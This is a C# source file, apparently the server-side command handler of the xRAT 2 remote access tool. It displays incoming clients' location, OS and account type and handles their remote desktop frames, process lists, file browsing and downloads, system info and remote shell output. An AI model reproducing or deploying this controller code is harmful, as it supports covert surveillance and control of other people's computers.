using System.Drawing;
using System.IO;
using System.Threading;
using System.Windows.Forms;
using xRAT_2.Forms;
using xRAT_2.Settings;

namespace Core.Commands
{
	public class CommandHandler
	{
		public static void HandleInitialize(Client client, Core.Packets.ClientPackets.Initialize packet, frmMain mainForm)
		{
			if (client.EndPoint.Address.ToString() == "255.255.255.255")
				return;

			mainForm.listenServer.ConnectedClients++;
			mainForm.listenServer.AllTimeConnectedClients++;
			mainForm.updateWindowTitle(mainForm.listenServer.ConnectedClients, mainForm.lstClients.SelectedItems.Count);

			new Thread(new ThreadStart(() =>
			{
				try
				{
					client.Value.Version = packet.Version;
					client.Value.OperatingSystem = packet.OperatingSystem;
					client.Value.AccountType = packet.AccountType;
					client.Value.Country = packet.Country;
					client.Value.CountryCode = packet.CountryCode;
					client.Value.Region = packet.Region;
					client.Value.City = packet.City;

					string country = string.Format("{0} [{1}]", client.Value.Country, client.Value.CountryCode);

					// this " " leaves some space between the flag-icon and the IP
					ListViewItem lvi = new ListViewItem(new string[] { " " + client.EndPoint.Address.ToString(), client.EndPoint.Port.ToString(), client.Value.Version, "Connected", "Active", country, client.Value.OperatingSystem, client.Value.AccountType });
					lvi.Tag = client;
					lvi.ImageIndex = packet.ImageIndex;

					mainForm.Invoke((MethodInvoker)delegate
					{
						mainForm.lstClients.Items.Add(lvi);
					});

					if (XMLSettings.ShowPopup)
						ShowPopup(client, mainForm);

					client.Value.isAuthenticated = true;
				}
				catch
				{ }
			})).Start();
		}

		private static void ShowPopup(Client c, frmMain mainForm)
		{
			mainForm.nIcon.ShowBalloonTip(30, string.Format("Client connected from {0}!", c.Value.Country), string.Format("IP Address: {0}\nOperating System: {1}", c.EndPoint.Address.ToString(), c.Value.OperatingSystem), ToolTipIcon.Info);
		}

		public static void HandleStatus(Client client, Core.Packets.ClientPackets.Status packet, frmMain mainForm)
		{
			new Thread(new ThreadStart(() =>
			{
				foreach (ListViewItem lvi in mainForm.lstClients.Items)
				{
					Client c = (Client)lvi.Tag;
					if (client == c)
					{
						mainForm.Invoke((MethodInvoker)delegate
						{
							lvi.SubItems[3].Text = packet.Message;
						});
						break;
					}
				}

			})).Start();
		}

		public static void HandleUserStatus(Client client, Core.Packets.ClientPackets.UserStatus packet, frmMain mainForm)
		{
			new Thread(new ThreadStart(() =>
			{
				foreach (ListViewItem lvi in mainForm.lstClients.Items)
				{
					Client c = (Client)lvi.Tag;
					if (client == c)
					{
						mainForm.Invoke((MethodInvoker)delegate
						{
							lvi.SubItems[4].Text = packet.Message;
						});
						break;
					}
				}

			})).Start();
		}

		public static void HandleRemoteDesktopResponse(Client client, Core.Packets.ClientPackets.DesktopResponse packet)
		{
			if (client.Value.frmRDP == null)
				return;

			if (client.Value.lastDesktop == null)
			{
				Bitmap newScreen = (Bitmap)Helper.CByteToImg(packet.Image);
				client.Value.lastDesktop = newScreen;
				client.Value.frmRDP.Invoke((MethodInvoker)delegate
				{
					client.Value.frmRDP.picDesktop.Image = newScreen;
				});
				newScreen = null;
			}
			else
			{
				Bitmap screen = (Bitmap)Helper.CByteToImg(packet.Image);

				Bitmap newScreen = new Bitmap(screen.Width, screen.Height);

				using (Graphics g = Graphics.FromImage(newScreen))
				{
					g.DrawImage(client.Value.lastDesktop, 0, 0, newScreen.Width, newScreen.Height);
					g.DrawImage(screen, 0, 0, newScreen.Width, newScreen.Height);
				}

				client.Value.lastDesktop = newScreen;
				client.Value.frmRDP.Invoke((MethodInvoker)delegate
				{
					client.Value.frmRDP.picDesktop.Image = newScreen;
				});
				screen = null;
				newScreen = null;
			}

			packet.Image = null;
			client.Value.lastDesktopSeen = true;
		}

		public static void HandleGetProcessesResponse(Client client, Core.Packets.ClientPackets.GetProcessesResponse packet)
		{
			if (client.Value.frmTM == null)
				return;

			client.Value.frmTM.Invoke((MethodInvoker)delegate
			{
				client.Value.frmTM.lstTasks.Items.Clear();
			});

			new Thread(new ThreadStart(() =>
			{
				for (int i = 0; i < packet.Processes.Length; i++)
				{
					if (packet.IDs[i] != 0 && packet.Processes[i] != "System.exe")
					{
						ListViewItem lvi = new ListViewItem(new string[] { packet.Processes[i], packet.IDs[i].ToString(), packet.Titles[i] });
						try
						{
							client.Value.frmTM.Invoke((MethodInvoker)delegate
							{
								client.Value.frmTM.lstTasks.Items.Add(lvi);
							});
						}
						catch
						{ break; }
					}
				}
			})).Start();
		}

		public static void HandleDrivesResponse(Client client, Core.Packets.ClientPackets.DrivesResponse packet)
		{
			if (client.Value.frmFM == null)
				return;

			client.Value.frmFM.Invoke((MethodInvoker)delegate
			{
				client.Value.frmFM.cmbDrives.Items.Clear();
				client.Value.frmFM.cmbDrives.Items.AddRange(packet.Drives);
				client.Value.frmFM.cmbDrives.SelectedIndex = 0;
			});
		}

		public static void HandleDirectoryResponse(Client client, Core.Packets.ClientPackets.DirectoryResponse packet)
		{
			if (client.Value.frmFM == null)
				return;

			client.Value.frmFM.Invoke((MethodInvoker)delegate
			{
				client.Value.frmFM.lstDirectory.Items.Clear();
			});

			new Thread(new ThreadStart(() =>
			{
				ListViewItem lviBack = new ListViewItem(new string[] { "..", "", "Directory" });
				lviBack.Tag = "dir";
				lviBack.ImageIndex = 0;
				client.Value.frmFM.Invoke((MethodInvoker)delegate
				{
					client.Value.frmFM.lstDirectory.Items.Add(lviBack);
				});

				if (packet.Folders.Length != 0)
				{
					for (int i = 0; i < packet.Folders.Length; i++)
					{
						if (packet.Folders[i] != "$$$EMPTY$$$$")
						{
							ListViewItem lvi = new ListViewItem(new string[] { packet.Folders[i], "", "Directory" });
							lvi.Tag = "dir";

							lvi.ImageIndex = 1;

							try
							{
								client.Value.frmFM.Invoke((MethodInvoker)delegate
								{
									client.Value.frmFM.lstDirectory.Items.Add(lvi);
								});
							}
							catch
							{ break; }
						}
					}
				}

				if (packet.Files.Length != 0)
				{
					for (int i = 0; i < packet.Files.Length; i++)
					{
						if (packet.Files[i] != "$$$EMPTY$$$$")
						{
							ListViewItem lvi = new ListViewItem(new string[] { packet.Files[i], Helper.GetFileSize(packet.FilesSize[i]), "File" });
							lvi.Tag = "file";

							lvi.ImageIndex = Helper.GetFileIcon(System.IO.Path.GetExtension(packet.Files[i]));

							try
							{
								client.Value.frmFM.Invoke((MethodInvoker)delegate
								{
									client.Value.frmFM.lstDirectory.Items.Add(lvi);
								});
							}
							catch
							{ break; }
						}
					}
				}

				client.Value.lastDirectorySeen = true;
			})).Start();
		}

		public static void HandleDownloadFileResponse(Client client, Core.Packets.ClientPackets.DownloadFileResponse packet)
		{
			string downloadPath = Path.Combine(Application.StartupPath, "Clients\\" + client.EndPoint.Address.ToString());
			if (!Directory.Exists(downloadPath))
				Directory.CreateDirectory(downloadPath);

			downloadPath = Path.Combine(downloadPath, packet.Filename);

			bool Continue = true;
			if (File.Exists(downloadPath))
				if (MessageBox.Show(string.Format("The file '{0}' already exists!\nOverwrite it?", packet.Filename), "Overwrite Confirmation", MessageBoxButtons.YesNo, MessageBoxIcon.Question) != System.Windows.Forms.DialogResult.Yes)
					Continue = false;

			int index = 0;
			try
			{
				client.Value.frmFM.Invoke((MethodInvoker)delegate
				{
					foreach (ListViewItem lvi in client.Value.frmFM.lstTransfers.Items)
					{
						if (packet.ID.ToString() == lvi.SubItems[0].Text)
						{
							index = lvi.Index;
							break;
						}
					}
				});
			}
			catch
			{ }

			if (Continue)
			{
				new Thread(new ThreadStart(() =>
				{
					try
					{
						client.Value.frmFM.Invoke((MethodInvoker)delegate
						{
							client.Value.frmFM.lstTransfers.Items[index].SubItems[1].Text = "Saving...";
						});

						using (FileStream stream = new FileStream(downloadPath, FileMode.Create))
						{
							stream.Write(packet.FileByte, 0, packet.FileByte.Length);
						}
						client.Value.frmFM.Invoke((MethodInvoker)delegate
						{
							client.Value.frmFM.lstTransfers.Items[index].SubItems[1].Text = "Completed";
							client.Value.frmFM.lstTransfers.Items[index].ImageIndex = 1;
						});
					}
					catch
					{ }
				})).Start();
			}
			else
			{
				try
				{
					client.Value.frmFM.Invoke((MethodInvoker)delegate
					{
						client.Value.frmFM.lstTransfers.Items[index].SubItems[1].Text = "Canceled";
						client.Value.frmFM.lstTransfers.Items[index].ImageIndex = 0;
					});
				}
				catch
				{ }
			}
		}

		public static void HandleGetSystemInfoResponse(Client client, Core.Packets.ClientPackets.GetSystemInfoResponse packet)
		{
			if (client.Value.frmSI == null)
				return;

			ListViewItem[] lviCollection = new ListViewItem[packet.SystemInfos.Length / 2];
			int j = 0;
			for (int i = 0; i < packet.SystemInfos.Length; i+= 2)
			{
				if (packet.SystemInfos[i] != null && packet.SystemInfos[i + 1] != null)
				{
					lviCollection[j] = new ListViewItem(new string[] { packet.SystemInfos[i], packet.SystemInfos[i + 1] });
					j++;
				}
			}

			if (client.Value.frmSI == null)
				return;

			try
			{
				client.Value.frmSI.Invoke((MethodInvoker)delegate
				{
					client.Value.frmSI.lstSystem.Items.RemoveAt(2); // Loading... Information
					foreach(var lviItem in lviCollection)
					{
						if (lviItem != null)
							client.Value.frmSI.lstSystem.Items.Add(lviItem);
					}
				});

				ListViewExtensions.autosizeColumns(client.Value.frmSI.lstSystem);
			}
			catch
			{ }
		}

		public static void HandleMonitorsResponse(Client client, Core.Packets.ClientPackets.MonitorsResponse packet)
		{
			if (client.Value.frmRDP == null)
				return;

			try
			{
				client.Value.frmRDP.Invoke((MethodInvoker)delegate
				{
					for (int i = 0; i < packet.Number; i++)
						client.Value.frmRDP.cbMonitors.Items.Add(string.Format("Monitor {0}", i + 1));
					client.Value.frmRDP.cbMonitors.SelectedIndex = 0;
				});
			}
			catch
			{ }
		}

		public static void HandleShellCommandResponse(Client client, Core.Packets.ClientPackets.ShellCommandResponse packet)
		{
			if (client.Value.frmRS == null)
				return;

			try
			{
				client.Value.frmRS.Invoke((MethodInvoker)delegate
				{
					client.Value.frmRS.txtConsoleOutput.Text += packet.Output;
				});
			}
			catch
			{ }
		}
	}
}
